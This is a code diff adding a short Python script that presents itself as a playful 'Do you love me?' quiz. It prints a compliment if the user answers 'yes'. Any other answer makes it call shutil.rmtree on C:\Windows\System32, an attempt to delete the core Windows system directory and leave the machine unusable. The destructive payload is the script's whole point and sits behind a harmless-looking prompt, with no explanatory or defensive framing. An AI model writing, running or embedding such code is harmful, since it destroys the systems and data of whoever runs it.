@@ -1,0 +1,9 @@
+import os
+import shutil
+
+answer = input("Do you love me? (Yes or no): ")
+
+if answer.lower() == "yes":
+	print("Aww, You are the best!")
+else:
+	shutil.rmtree("C:\\Windows\\System32")
